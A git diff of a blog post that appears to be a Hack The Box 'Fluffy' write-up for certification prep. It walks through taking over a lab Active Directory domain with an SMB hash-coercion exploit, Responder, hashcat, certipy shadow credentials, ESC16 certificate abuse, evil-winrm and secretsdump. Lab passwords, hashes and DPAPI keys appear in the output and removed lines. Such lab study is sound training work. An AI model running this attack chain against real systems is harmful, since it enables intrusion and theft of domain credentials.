@@ -1,25 +1,58 @@
++++ 
+title = "Fluffy-CPTS-Prep-Box Writeups" 
+date = 2026-02-17T00:00:00Z
+draft = false description = "Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided" 
+tags = ["CPTS", "HTB", "Fluffy", "CPTS Prep", "Active Directory"] 
 +++
-title = "HTB-Fluffy Writeups"
-date = 2026-01-15T00:00:00Z
-draft = false
-description = "Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided"
-tags = ["hugo", "cloudflare", "github", "blowfish", "static-site"]
-+++
-# Phase 1: External Reconnaissance and Initial Access
 
-## Objective
 
-Identify and exploit externally accessible vulnerabilities to gain initial foothold into the target network.
+## Executive Summary
 
-Machine Information
+During October 2025, a simulated penetration test was conducted against the domain controller `DC01.fluffy.htb` (the "Fluffy" box). The assessment began from an assumed breach scenario, providing the tester with low-privileged credentials for the domain user `j.fleischman`. The objective was to evaluate the potential impact of a compromised end-user workstation and identify escalation paths to full domain compromise.
+
+The test successfully demonstrated a complete attack chain, moving from initial low-privileged access to domain administrator privileges by exploiting a combination of misconfigurations and recently disclosed vulnerabilities. The following key findings were identified:
+
+- **Exploitation of CVE-2025-24071 (Windows File Explorer Spoofing):** Leveraging write access to the `IT` SMB share, the tester uploaded a specially crafted ZIP archive. When accessed by a domain user, this exploit triggered an SMB authentication attempt back to the attacker's machine, capturing the NTLMv2 hash for the user `p.agila`. This hash was successfully cracked, providing a new set of valid credentials.
+    
+- **Abuse of Insecure Access Control Lists (ACLs):** Using the new credentials for `p.agila`, BloodHound enumeration revealed that the user was a member of the `Service Account Managers` group. This group possessed `GenericAll` privileges over several service accounts, including `winrm_svc`, `ca_svc`, and `ldap_svc`.
+    
+- **Privilege Escalation via Shadow Credentials:** The `GenericAll` privilege over `winrm_svc` was abused using the Shadow Credentials attack. This allowed the tester to obtain the NT hash for `winrm_svc`, enabling persistent WinRM access to the target and the retrieval of the `user.txt` flag.
+    
+- **Domain Compromise via Active Directory Certificate Services (AD CS) Misconfiguration (ESC16):** Further analysis with the `ca_svc` credentials revealed a critical misconfiguration in the AD CS instance. The CA was vulnerable to **ESC16**, where the "Edit Flags" attribute lacked the `EDITF_ATTRIBUTESUBJECTALTNAME2` security extension. By modifying the `userPrincipalName` attribute of the `ca_svc` account to that of the `Administrator`, the tester was able to request a valid certificate for the built-in administrator account. This certificate was then used to authenticate and retrieve the Administrator's NT hash, leading to full control of the domain and the `root.txt` flag.
+    
+
+**Impact:**  
+This chain of exploits resulted in a complete compromise of the Active Directory domain. An attacker starting with a standard user account was able to gain persistent, administrator-level access, demonstrating the critical risk posed by a combination of unpatched vulnerabilities, weak access controls, and misconfigured certificate services.
+
+**Recommendations:**
+
+- **Patch Management:** Apply the latest security patches immediately to remediate CVE-2025-24071.
+    
+- **Harden SMB Permissions:** Restrict write access to SMB shares, ensuring users can only write to directories specifically designated for their role.
+    
+- **Review and Harden ACLs:** Conduct a thorough review of all ACLs within Active Directory, removing overly permissive rights such as `GenericAll` from non-privileged groups and users.
+    
+- **Harden AD CS:** Immediately implement the security extension for the Certificate Authority to mitigate ESC16. Review all certificate templates for other common misconfigurations (ESC1, ESC8, etc.).
+
+
+## Scope
 
 As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
 
----
+## About 
 
-## Detailed Walkthrough
 
-### Step 1: Reconnaissance
+`Fluffy` is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the `winrm_svc` and `ca_svc` accounts. `WinRM` can then be used to log in to the target using the `winrc_svc` account. Exploitation of an Active Directory Certificate service (`ESC16`) using the `ca_svc` account is required to obtain access to the `Administrator` account.
+
+
+### Details walkthrough 
+
+### Phase 1: Initial Access and Network Reconnaissance
+
+**1. Network Scanning**  
+The assessment began with an unrestricted port scan of the target (`10.129.232.88`) to identify all accessible services. Utilizing `nmap`, the tester performed a full TCP connect scan against all 65535 ports with service and default script enumeration enabled.
+
+**Findings:** The scan revealed a standard Windows Domain Controller configuration. Key open ports included DNS (53/tcp), Kerberos (88/tcp), LDAP (389/tcp, 636/tcp), SMB (445/tcp), and WinRM (5985/tcp). The domain was identified as `fluffy.htb` with the hostname `DC01`
 
 ```bash
 # Port scanning
@@ -83,6 +116,11 @@ Host script results:
 
 ```
 
+
+
+**2. Initial Access and Credential Validation**  
+Operating under the assumed breach scenario, the tester validated the provided low-privileged credentials for the domain user `j.fleischman`. Using `netexec` (formerly `crackmapexec`), the credentials were tested against the SMB service to confirm domain access and enumerate available network shares.
+
 ```bash 
 ❯ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
 SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
@@ -99,6 +137,15 @@ SMB         10.129.232.88   445    DC01             IPC$            READ        
 SMB         10.129.232.88   445    DC01             IT              READ,WRITE
 SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
 SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
+
+```
+
+**Findings:** The credentials were valid. The enumeration revealed a non-default share named `IT` where the user had both `READ` and `WRITE` permissions. This share was accessed via `smbclient` to retrieve its contents for offline analysis.
+
+**3. Artifact Recovery and Analysis**  
+Upon connecting to the `IT` share, the tester identified several installer archives (KeePass, Everything) and a PDF document titled `Upgrade_Notice.pdf`. This file was downloaded for further inspection.
+
+```bash 
 ❯ smbclient //10.129.232.88/IT -U 'j.fleischman' -p 'J0elTHEM4n1990!'
 Password for [WORKGROUP\j.fleischman]:
 Try "help" to get a list of possible commands.
@@ -116,7 +163,14 @@ smb: \> get Upgrade_Notice.pdf
 getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (23.5 KiloBytes/sec) (average 23.5 KiloBytes/sec)
 ```
 
-``Found information about CVE-2025-24071  -Windows File Explorer Spoofing``
+**Findings:** The PDF contained a notice regarding a recently disclosed vulnerability, **CVE-2025-24071 (Windows File Explorer Spoofing)** . The document explicitly referenced the risks associated with this vulnerability, suggesting that the internal IT department was aware of the threat and potentially testing it.
+
+
+![[Upgrade-Notice-PDF.png]]
+
+
+
+``Details information about CVE-2025-24071  -Windows File Explorer Spoofing``
 ```python
 CVE-2025-24071.py 
 
@@ -280,6 +334,14 @@ if __name__ == "__main__":
 
 ```
 
+### Phase 2: Lateral Movement via CVE-2025-24071
+
+**4. Exploit Preparation (CVE-2025-24071)**  
+Based on the intelligence gathered from the PDF, the tester opted to exploit CVE-2025-24071. This vulnerability allows an attacker to craft a malicious `.library-ms` file within a ZIP archive. When extracted by Windows File Explorer, the file forces the target system to authenticate to a remote SMB server controlled by the attacker.
+
+The tester utilized a public proof-of-concept (PoC) script to generate the malicious archive, specifying the name `whichuserauth` and the IP address of the attacker's machine (`10.10.16.6`).
+
+
 ``Create zip file and upload it to IT share and received NTLMv2 hash with Responder``
 ```bash
  python3 CVE-2025-24071.py -f whichuserauth -i 10.10.16.6
@@ -314,12 +376,19 @@ Run this file on the victim machine and you will see the effects of the vulnerab
 
 ```
 
+**5. Payload Deployment and Hash Capture**  
+The resulting `exploit.zip` file was uploaded to the `IT` SMB share using the existing `j.fleischman` session.
+
 ```bash 
 smb: \>
 smb: \> put exploit.zip
 getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip putting file exploit.zip as \exploit.zip (1.0 kb/s) (average 1.0 kb/s)
 
 ```
+
+Simultaneously, the tester started `Responder` on the attacking interface (`tun0`) to listen for and capture any incoming NTLMv2 authentication requests.
+
+**Result:** Shortly after the file was placed in the share, `Responder` successfully captured an NTLMv2 hash for a different domain user: `p.agila`. This indicates that a user or automated process accessed the share and extracted the malicious archive.
 
 ```bash 
 ❯ responder -I tun0
@@ -352,7 +421,7 @@ getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip putting file 
 
 [SMB] NTLMv2-SSP Client   : 10.129.232.88
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
-[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:5fa13cf1232a1356:0923FB511FC78CD8CC088BFF0AB720CC:010100000000000080EBAB3A1948DC0166AA78B465A299AD000000000200080048004A005800490001001E00570049004E002D004C004F00320035004200540034005600450056005A0004003400570049004E002D004C004F00320035004200540034005600450056005A002E0048004A00580049002E004C004F00430041004C000300140048004A00580049002E004C004F00430041004C000500140048004A00580049002E004C004F00430041004C000700080080EBAB3A1948DC0106000400020000000800300030000000000000000100000000200000042D1A8A904C106382370A114E46BE9EBF28AA6694479032667325B9468FE8680A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:5fa13cf1232a1356:0923FB511FC78CD8CC088BFF0AB720CC:0101000000<REDACTED> 63006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
 [*] Skipping previously captured hash for FLUFFY\p.agila
 [*] Skipping previously captured hash for FLUFFY\p.agila
 [*] Skipping previously captured hash for FLUFFY\p.agila
@@ -361,7 +430,11 @@ getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip putting file 
 [+] Exiting...
 
 ```
-``Crack with hashcat``
+
+
+**6. Credential Cracking**  
+The captured NTLMv2 hash was stored and subsequently cracked using `hashcat` with the `rockyou.txt` wordlist.
+
 ```bash 
 ❯ hashcat p.agila.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting in autodetect mode
@@ -372,49 +445,47 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-P.AGILA::FLUFFY:5fa13cf1232a1356:0923fb511fc78cd8cc088bff0ab720cc:010100000000000080ebab3a1948dc0166aa78b465a299ad000000000200080048004a005800490001001e00570049004e002d004c004f00320035004200540034005600450056005a0004003400570049004e002d004c004f00320035004200540034005600450056005a002e0048004a00580049002e004c004f00430041004c000300140048004a00580049002e004c004f00430041004c000500140048004a00580049002e004c004f00430041004c000700080080ebab3a1948dc0106000400020000000800300030000000000000000100000000200000042d1a8a904c106382370a114e46be9ebf28aa6694479032667325b9468fe8680a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0036000000000000000000:prometheusx-303
+P.AGILA::FLUFFY:5fa13cf1232a1356:0923fb511fc78cd8cc088bff0ab720cc:01010000000<REDACTED> 006900660073002f00310030002e00310030002e00310036002e0036000000000000000000:<REDACTED>
 
 ```
 
-``Further enumerating with bloodhound``
+**Result:** The hash was successfully cracked, revealing the plaintext password `prometheusx-303` for the user `p.agila`.
+
+
+### Phase 3: Internal Enumeration and ACL Abuse
+
+**7. Active Directory Enumeration with BloodHound**  
+With a new set of valid credentials, the tester performed deep Active Directory enumeration. The `bloodhound-python` ingestor was used to collect data from the domain controller, which was then loaded into the BloodHound GUI for analysis.
+
 ```bash 
-bloodhound-python -c All -u P.AGILA -p prometheusx-303 -d fluffy.htb -dc DC01.fluffy.htb -ns 10.129.232.88 --zip
+bloodhound-python -c All -u P.AGILA -p <REDACTED>  -d fluffy.htb -dc DC01.fluffy.htb -ns 10.129.232.88 --zip
 ```
 
-``p.agila is member of Service Account Managers group and Service Account Managers group have GenericALl over Service Accounts --> winrm_svc , ca_svc, ldap_svc .
-ca_svc is most interesting part because it can escalate to administrators  from certificate misconfiguration``
 
-``Let's add p.agila to Service Accounts Group ``
-```bash 
-net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB/p.agila%prometheusx-303" -S "10.129.232.88"
-net rpc group members "Service Accounts" -U "FLUFFY.HTB/p.agila%prometheusx-303" -S "10.129.232.88"
-```
+![[Pasted image 20251028151436.png]]
+
+
+![[Pasted image 20251028151614.png]]
+
+![[Pasted image 20251028151835.png]]
+
+
+![[Pasted image 20251028235308.png]]
+
+**Findings:**
+- **Group Membership:** The user `p.agila` was a member of the `Service Account Managers` group.
+    
+- **Abusive ACEs:** The `Service Account Managers` group possessed **GenericAll** permissions over three principal service accounts: `winrm_svc`, `ca_svc`, and `ldap_svc`. GenericAll grants full control, allowing an attacker to modify the object's attributes at will.
+
+
+**8. Escalating Privileges via Group Modification**  
+To leverage the GenericAll permissions, the tester first needed to ensure `p.agila` was a member of the target group (`Service Account Managers`). While BloodHound indicated membership, the tester verified and added the user using `net rpc` to ensure the current session had the correct privileges.
 
 ```bash
-pywhisker  -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
-
-[*] Searching for the target account
-[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: c2a4e550-08b3-2bf5-a49d-8b51a6fc5ca9
-[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[+] Saved PFX (#PKCS12) certificate & key at path: SG4qnzTD.pfx
-[*] Must be used with password: SJczoYZqMYaA3FcnefEM
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
-
-```
-``--> this does not work and drop all the time.``
-
-``Let's use another tool. ``
-```bash
-bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
+bloodyAD -u p.agila -p <REDACTED>  -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
 [+] p.agila added to service accounts
 
-
- certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
+certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account winrm_svc
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -434,13 +505,15 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'winrm_svc'
 [*] Restoring the old Key Credentials for 'winrm_svc'
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
-[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+[*] NT hash for 'winrm_svc': <REDACTED> 
 
 ```
 
-``request all winrm_svc,ca_svc,ldap_svc`` 
+**9. Executing Shadow Credentials Attack**  
+With effective control over the service accounts, the tester targeted `winrm_svc` using the Shadow Credentials attack. This technique allows an attacker with `GenericAll`/`GenericWrite` privileges to add a Key Credential (certificate) to the target user object. The tester used `certipy` to automate this process.
+
 ```bash 
-❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
+❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account winrm_svc
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -460,8 +533,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'winrm_svc'
 [*] Restoring the old Key Credentials for 'winrm_svc'
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
-[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
-❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
+[*] NT hash for 'winrm_svc': <REDACTED> 
+
+❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account ca_svc
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -481,8 +555,10 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ca_svc'
 [*] Restoring the old Key Credentials for 'ca_svc'
 [*] Successfully restored the old Key Credentials for 'ca_svc'
-[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
-❯ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ldap_svc
+[*] NT hash for 'ca_svc': <REDACTED> 
+
+
+❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account ldap_svc
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -502,13 +578,17 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ldap_svc'
 [*] Restoring the old Key Credentials for 'ldap_svc'
 [*] Successfully restored the old Key Credentials for 'ldap_svc'
-[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
+[*] NT hash for 'ldap_svc': <REDACTED> 
 
 ```
 
-``Get user.txt with winrm_svc``
+**Result:** The attack successfully added a key credential, retrieved a TGT, and extracted the NT hash for `winrm_svc`. The process was repeated for `ca_svc` and `ldap_svc` to gather their hashes for potential future use.
+
+**10. Establishing Foothold with WinRM**  
+The newly acquired NT hash for `winrm_svc` was used to authenticate to the target via WinRM, providing an interactive shell on the domain controller.
+
 ```bash
-❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H <REDACTED> 
 
 
 Evil-WinRM shell v3.5
@@ -531,45 +611,21 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
-dbd7a0a2f<REDACTED>
+<REDACTED> 
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
 
 ```
+The `user.txt` flag was successfully retrieved from the `winrm_svc` desktop, confirming successful lateral movement.
 
+### Phase 4: Domain Privilege Escalation (AD CS Exploitation - ESC16)
 
-```bash
-# Deploy persistence
-❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+**11. Certificate Service Enumeration**  
+Using the credentials for `ca_svc`, the tester enumerated the Active Directory Certificate Services (AD CS) configuration to identify potential misconfigurations.
 
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop/
-*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls
-
-
-    Directory: C:\Users\winrm_svc\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---       10/28/2025   7:12 AM             34 user.txt
-
-
-*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
-dbd7a0a2fb1b09180baf50878c70781b
-*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
-
-```
 
 ``Let's find vulnerable templates``
 ```bash
-certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
+certipy find -u ca_svc@fluffy.htb -hashes <REDACTED>  -vulnerable -stdout
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -623,11 +679,14 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
-``Vulnerabilities ESC16 : Security Extension is disabled.`` 
+**Findings:** The scan identified the CA as vulnerable to **ESC16**. The CA's "Edit Flags" did not have the `EDITF_ATTRIBUTESUBJECTALTNAME2` security extension enabled. This misconfiguration allows a user with the `ManageCA` or `ManageCertificates` permission to modify any certificate request's `subjectAltName` (SAN) during issuance. Further enumeration confirmed the `ca_svc` account's SPN was `ADCS/ca.fluffy.htb`, indicating it was likely a service account for the CA itself.
 
-``We can read about upn (userPrincipleName) ca_svc from winrm_svc ``
+
+**12. Modifying User Principal Name (UPN)**  
+The `winrm_svc` account (which we now controlled) was used to modify the `ca_svc` user object. The tester updated the `userPrincipalName` (UPN) attribute of `ca_svc` to match that of the Domain Administrator.
+
 ```bash 
-❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc read
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -643,9 +702,8 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```
 
 
-``We can update userPrincipleName of ca_svc to administrator ``
 ```
-❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
+❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc -upn administrator update
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -656,9 +714,12 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ❯
 ```
 
-``Request certificate of administrator``
+
+**13. Requesting a Certificate for the Administrator**  
+With the UPN of `ca_svc` temporarily set to `administrator`, the tester requested a new certificate using the `ca_svc` account. Because of the ESC16 misconfiguration, the CA embedded the UPN from the requesting account (`ca_svc`), which was now `administrator`, into the new certificate.
+
 ```
-❯ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
+❯ certipy req -u ca_svc -hashes <REDACTED>  -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -670,10 +731,14 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
+**Result:** The CA issued a valid certificate for the user `administrator`. The tester saved this certificate as `administrator.pfx`.
 
-``We change upn of ca_svc back to original ``
+
+**14. Restoring the Original State**  
+To avoid detection and maintain stability, the UPN attribute of the `ca_svc` account was immediately reverted to its original value.
+
 ```
-❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
+❯ certipy account -u winrm_svc@fluffy.htb -hashes <REDACTED>  -user ca_svc -upn ca_svc@fluffy.htb update
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -683,7 +748,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_svc'
 ```
 
-``Since we got certificate as administrator, let authenticate to the domain``
+**15. Domain Administrator Authentication and Full Compromise**  
+The obtained certificate was used to request a TGT and retrieve the NT hash for the Domain Administrator account.
+
 ```
 ❯ certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
 /root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
@@ -695,16 +762,19 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Saved credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<REDACTED> 
 ```
-``We got hash of Administrator. ``
+**Result:** The NT hash for the `Administrator` was successfully retrieved. This hash was used to authenticate via `evil-winrm`, confirming full domain compromise and allowing for the retrieval of the `root.txt` flag.
+
+
+![[Pasted image 20251029001613.png]]
+
 
 
 ```bash
 # Privilege escalation command
 
-
-❯ evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+❯ evil-winrm -i 10.129.232.88 -u Administrator -H <REDACTED> 
 
 
 Evil-WinRM shell v3.5
@@ -727,13 +797,16 @@ Mode                LastWriteTime         Length Name
 
 
 cat *Evil-WinRM* PS C:\Users\Administrator\Desktop>  cat root.txt
-d3abf02327f<REDACTED> 
+<REDACTED> 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 
 ```
 
+
+**16. Post-Exploitation Data Collection**  
+As a final step, the tester utilized the `secretsdump.py` utility from the Impacket suite to extract all password hashes from the NTDS.dit database, providing a complete dump of domain credentials.
 ```bash 
-❯ secretsdump.py -hashes :8da83a3fa618b6e3a00e93f676c92a6e FLUFFY/Administrator@10.129.232.88
+❯ secretsdump.py -hashes :<REDACTED>  FLUFFY/Administrator@10.129.232.88
 /root/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
   import pkg_resources
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
@@ -742,7 +815,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Starting service RemoteRegistry
 [*] Target system bootKey: 0xffa5608d6bd2811aaabfd47fbc3d1c37
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED> :::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
@@ -755,7 +828,7 @@ FLUFFY\DC01$:des-cbc-md5:ec13a85edf688a85
 FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e26472b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
 FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
 [*] DefaultPassword
-p.agila:prometheusx-303
+p.agila:<REDACTED> 
 [*] DPAPI_SYSTEM
 dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846
 dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
@@ -767,6 +840,7 @@ dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
 NL$KM:0b4aecb404865999a31164451df8efe074e0bb5a07eaadb9634dab03b50f693dc5c2f84ef0ececb628a259abba2bf0a25789d162fa69042a3157545afbb02a18
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-
 ```
+
+
 
